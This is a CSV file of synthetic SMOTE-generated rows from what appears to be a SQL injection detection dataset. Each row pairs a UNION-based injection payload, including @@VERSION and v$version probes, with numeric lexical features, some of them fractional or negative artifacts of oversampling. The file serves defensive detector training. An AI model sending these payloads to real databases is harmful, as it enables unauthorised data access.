id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000245,attack,union,"-2441' union all select 1853,1853,1853,1853,1853,1853,1853--",nearest_attack_euclidean,R000624,0.014521748648537324,59.8963604802091,20.0,3.8753491893077854,14.0,31.91708838416728,4.0,9.97927209604182,0.23377301614456744,0.5328308386919229,0.06679229032701926,0.16660385483649034,1.0,0.0,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.97927209604182,3.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000246,attack,union,"-2430'  )   union all select 5712,5712,5712,5712,5712,5712,5712,5712,5712,5712--",nearest_attack_euclidean,R000719,0.012679339281081078,80.0,21.951900611720937,3.77384197681865,14.0,44.0,8.0,14.0,0.175,0.55,0.1,0.175,1.0,0.0,3.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,9.0,3.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000247,attack,union," select * from users where id  =  1 union select @&&@,version  (    )   -- 1",nearest_attack_euclidean,R000176,0.02445823294636979,76.13020724285784,26.065103621428918,3.9079314598522505,40.0,2.032551810714459,23.065103621428918,11.032551810714459,0.5254591628759353,0.026679855777727468,0.3029528139215243,0.14490816742481294,0.0,0.0,2.0,0.0,1.0,1.0,0.0,2.0,0.0,0.0,0.9999999999999996,6.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000248,attack,union,"-5225'   )    )    as zats where 5629  =  5629 union all select 5629,5629,5629,5629,5629--",nearest_attack_euclidean,R000319,0.8719133188018067,86.57833182845754,25.466429216375342,3.9357259027725706,25.0,32.0,19.067141567249315,10.511190261208219,0.2892291438137298,0.37021330408157416,0.21918600278800168,0.12137154931669436,1.0,0.0,3.0,0.0,0.0,1.0,0.0,1.511190261208219,0.0,0.0,4.0,4.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000249,attack,union,"-4960 union all select 4031,4031#",nearest_attack_euclidean,R000295,0.5597870649546752,35.342858785902436,20.937143514360976,4.186595057033962,14.0,13.874287028721952,4.0,3.468571757180489,0.3980861060585054,0.3905400051969658,0.11373888744528726,0.09763500129924145,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.468571757180488,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000250,attack,union,"-2359' union all select 2687,2687,2687#",nearest_attack_euclidean,R000528,0.2579460529071118,40.22835999420395,21.75432800115921,4.194066867458954,14.0,16.98268799536316,4.0,5.24567199884079,0.348952773940061,0.42113698829364804,0.09970079255430316,0.1302094452119878,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.2456719988407903,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000251,attack,union," select * from users where id  =  '1' or \.<\ union select 1,@@VERSION -- 1'",nearest_attack_euclidean,R000003,0.03332692546898658,76.0,33.12539703433005,4.443293024055568,42.0,3.0,17.0,14.0,0.5526315789473685,0.03947368421052633,0.2236842105263158,0.18421052631578946,3.0,0.0,2.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.9999999999999996,5.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_000252,attack,union,"-1653 union all select 8415,8415,8415,8415,8415,8415,8415,8415#",nearest_attack_euclidean,R000573,0.40336017195803336,63.0,20.0,3.63388058713603,14.0,36.0,4.0,9.0,0.2222222222222222,0.5714285714285714,0.06349206349206349,0.14285714285714285,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000253,attack,union," select * from users where id  =  1 +$+ union select null,@@VERSION -- 1",nearest_attack_euclidean,R000119,0.39919604793498076,72.3929995620824,31.130999854027465,4.368308549940956,44.0,2.130999854027465,16.130999854027465,10.130999854027465,0.6079088924571064,0.029378887104780094,0.2228044437956776,0.13990777664243584,0.0,0.0,2.0,0.0,1.0,1.0,0.0,0.0,0.13099985402746417,0.0,0.9999999999999996,6.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000254,attack,union," select * from users where id  =  1 *1 union select 1,banner from v$version where rownum  =  1 -- 1",nearest_attack_euclidean,R000018,0.40650524840934044,98.64363845953042,25.178180770234786,4.015084842865316,62.0,4.8218192297652145,23.82181922976521,8.0,0.6285634088835899,0.04885368233355242,0.24147795279787837,0.08110495598497934,0.0,0.0,2.0,0.0,1.8218192297652134,2.0,0.0,0.0,0.0,0.0,0.9999999999999996,5.821819229765213,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,1.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000255,attack,union,"-6086"" union all select 8700,8700,8700,8700--",nearest_attack_euclidean,R000496,0.03797881456444021,45.21745310791096,18.086981243164384,3.7962950052343327,14.0,20.173962486328772,4.0,7.043490621582192,0.3097580695507762,0.4459907776562557,0.08850230558593607,0.15574884720703197,0.0,1.0,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0434906215821926,3.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000256,attack,union,"-3391' union all select 2024,2024--",nearest_attack_euclidean,R000188,0.11569692268877244,35.0,19.615317596832664,4.098124191766869,14.0,12.0,4.0,5.0,0.4,0.34285714285714286,0.11428571428571428,0.14285714285714285,1.0,0.0,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9999999999999996,3.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000257,attack,union," select * from users where id  =  '1' union select @ 1,version  (    )   --  1'",nearest_attack_euclidean,R000081,0.21892377128600604,79.40634184144946,26.0,3.864315943177988,40.0,3.0,25.0,11.406341841449457,0.5037573301174085,0.037781799758805634,0.3148483313233803,0.14361253880040556,3.0,0.0,2.0,0.0,1.0,1.0,0.0,2.0,0.0,0.0,0.9999999999999996,4.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000258,attack,union,"-1891' in boolean mode  )   union all select 6680,6680,6680,6680,6680,6680,6680,6680#",nearest_attack_euclidean,R000207,0.25612183897397134,86.87588661308679,24.0,3.892835881329679,27.0,37.50070929046943,11.0,11.37517732261736,0.3110262825420466,0.43137625772794475,0.126714411406019,0.13088304832398964,1.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,7.375177322617359,1.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000259,attack,union,"1' in boolean mode  )   union all select null,null,null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R000563,0.2758051642009802,88.93677299265862,19.0,3.361802464812852,65.34941839412689,1.0,11.0,11.587354598531723,0.7342712759502864,0.01133253862926098,0.12465792492187067,0.129738260498582,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,8.587354598531721,-4.440892098500626e-16,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000260,attack,union,"1' in boolean mode  )   union all select null,null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R000197,0.07330918492768371,86.56467793866213,19.0,3.380923287602177,63.451742350929706,1.0,11.0,11.112935587732425,0.732976633279356,0.011555752882869696,0.12711328171156616,0.12835433212620817,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,8.112935587732427,-4.440892098500626e-16,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000261,attack,union,"-9941 union all select 1321,1321,1321,1321,1321,1321,1321#",nearest_attack_euclidean,R000288,0.30621837304499644,60.118201666760996,19.4236403333522,3.5602591993281445,14.0,33.6945613334088,4.0,8.4236403333522,0.23326359514650957,0.5600717307064473,0.06664674147043131,0.1400179326766118,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.4236403333522,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000262,attack,union,"-9997' union all select 9347,9347,9347,9347,9347,9347,9347,9347#",nearest_attack_euclidean,R000380,0.0033699991608398326,63.97906639926719,19.0,3.6403083108295395,14.0,35.983253119413746,4.0,9.995813279853436,0.21883480046593154,0.5624079309227029,0.06252422870455188,0.1562330399068137,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.995813279853437,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000263,attack,union,"-6368' union all select 6529,6529,6529--",nearest_attack_euclidean,R000340,0.6405778942774386,40.0,19.046365125520417,3.9423164615702793,14.0,16.0,4.0,6.0,0.35,0.4,0.1,0.15,1.0,0.0,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.9999999999999998,3.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000264,attack,union,"-9958""  )   as jzvq where 3741  =  3741 union all select 3741,3741,3741#",nearest_attack_euclidean,R000204,0.2947405137810746,70.601012463604,30.440404985441596,4.2834468831191135,25.0,22.880809970883192,16.0,6.720202492720797,0.35505705385526437,0.3228033196185246,0.2272365144673692,0.09490311205884173,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,1.7202024927207975,2.0,0.0,1.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000265,attack,union,"-5247"" union all select 3097,3097,3097,3097,3097,3097,3097#",nearest_attack_euclidean,R000252,0.350776698345746,60.953536821590234,21.609292635681953,3.8750121467020833,14.0,33.56282945727219,4.0,9.390707364318047,0.23004514949622268,0.5502366948326726,0.06572718557034933,0.15399097010075546,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.390707364318047,1.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000266,attack,union," select * from users where id  =  1.*\ union select null,@@VERSION -- 1",nearest_attack_euclidean,R000175,0.01616019183527717,71.0379924018385,31.009498100459624,4.395959118896113,44.0,2.0,15.018996200919249,10.018996200919249,0.619404382031757,0.02815474463780715,0.21141386746247684,0.14102700586795902,0.0,0.0,2.0,0.0,2.0,1.0,0.0,0.0,0.0,0.0,0.9999999999999996,5.018996200919249,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000267,attack,union," select * from users where id  =  '1' union select @ 1,version  (    )   --  1'",nearest_attack_euclidean,R000081,0.005938757311012558,79.0110228577173,26.0,3.8549226315736416,40.0,3.0,25.0,11.011022857717297,0.5062593490017893,0.03796945117513417,0.3164120931261183,0.13935910669695825,3.0,0.0,2.0,0.0,1.0,1.0,0.0,2.0,0.0,0.0,0.9999999999999996,4.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000268,attack,union," select * from users where id  =  '1' or $<\ union select 1,@@VERSION -- 1'",nearest_attack_euclidean,R000137,0.23879654344794143,76.0,33.0,4.431423196002038,42.0,3.523095595409945,17.0,13.476904404590053,0.5526315789473685,0.04635652099223614,0.2236842105263158,0.17732768953407965,3.0,0.0,2.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.9999999999999996,5.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_000269,attack,union,"-7501'+  (  select uloc where 3089  =  3089 union all select 3089,3089,3089,3089,3089,3089,3089,3089,3089,3089--",nearest_attack_euclidean,R000273,0.07420193816318227,111.43108544094147,27.0,4.035921968746149,29.0,51.54486835275318,15.0,15.886217088188292,0.2603727698015317,0.46241323639525556,0.13467557058699914,0.1425384232162137,1.0,0.0,3.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,8.886217088188292,5.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000270,attack,union,"-1171' union all select 3958,3958,3958,3958,3958--",nearest_attack_euclidean,R000233,0.35397129305424324,47.81757143303383,20.563514286606765,3.999835367571124,14.0,22.254057146427062,4.0,7.563514286606765,0.2935795555277896,0.46448050796824053,0.08387987300793985,0.15806006349603008,1.0,0.0,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.563514286606765,3.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000271,attack,union,"-8005""  )   union all select 5213,5213,5213,5213,5213--",nearest_attack_euclidean,R000690,0.20581911089338775,56.19233371661305,20.76153325667739,3.973814548242246,14.0,24.95386697329044,8.0,9.23846674332261,0.24948706908103552,0.4435899013128064,0.14256403947487745,0.16435899013128064,0.0,1.0,3.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,4.23846674332261,3.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000272,attack,union,"-6377'||  (  select 'ryin' where 2113  =  2113 union all select 2113,2113,2113#",nearest_attack_euclidean,R000473,0.2644066058930899,78.10728313832934,27.71417348933653,4.215982599943294,29.0,23.28582651066347,15.0,10.821456627665867,0.37151706961827735,0.29781140934357,0.1921640015266952,0.13850751951145754,3.0,0.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,1.8214566276658668,4.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,2.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000273,attack,union," select * from users where id  =  1 +1 union select null,banner from v$version where rownum  =  1 -- 1",nearest_attack_euclidean,R000045,0.41883055510587214,101.5422543572315,25.5422543572315,4.021415045644065,66.0,3.5422543572314993,24.4577456427685,7.542254357231499,0.6499913815203573,0.03486128198492394,0.24089263744795486,0.07425469904676384,0.0,0.0,2.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.9999999999999996,5.542254357231499,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,1.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000274,attack,union,"-5731"" union all select 3083,3083,3083#",nearest_attack_euclidean,R000481,0.2794808477602807,37.46185513084658,20.692371026169315,4.059390898859821,14.0,14.769484104677264,4.0,4.692371026169316,0.37521419922183097,0.39262458370201203,0.10720405692052314,0.1249571601556338,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.6923710261693157,1.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000275,attack,union,"-6667%""   )    )    union all select 7348,7348,7348,7348,7348,7348,7348,7348#",nearest_attack_euclidean,R000303,0.1307235189764633,76.01306093121619,22.0,3.8150831559006653,14.0,35.21044874497295,14.0,12.80261218624324,0.18471243128675602,0.4622401256470747,0.18471243128675605,0.16833501177941326,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,0.0,6.8026121862432385,1.0,0.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000276,attack,union,"1'+  (  select yfuu where 1717  =  1717 union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000317,0.034052746963760296,102.80638285375514,24.03872342924897,3.731647700973294,64.84510628300411,9.0,15.0,13.961276570751027,0.6307342046419002,0.08755127346108621,0.14591878910181028,0.13579573279520346,1.0,0.0,2.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,7.961276570751028,4.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000277,attack,union,"-7611  )   as tuje where 6101  =  6101 union all select 6101,6101,6101,6101,6101,6101,6101,6101--",nearest_attack_euclidean,R000352,0.7224476225146234,91.77501238151332,23.0,3.7239232055703964,25.0,39.820009905210654,16.0,10.955002476302663,0.2741544745363549,0.431536386223139,0.17545886370326716,0.11885027553723895,0.0,0.0,3.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,5.955002476302664,4.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000278,attack,union,"-9574'  )   as rxym where 4719  =  4719 union all select 4719,4719,4719,4719,4719,4719,4719--",nearest_attack_euclidean,R000425,0.060839474206268146,93.47378131784869,27.031585421189913,4.030657736534465,25.0,40.37902505427895,16.0,12.094756263569737,0.2676379397703885,0.43173019487594533,0.1712882814530487,0.12934358390061743,1.0,0.0,3.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,6.094756263569737,4.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
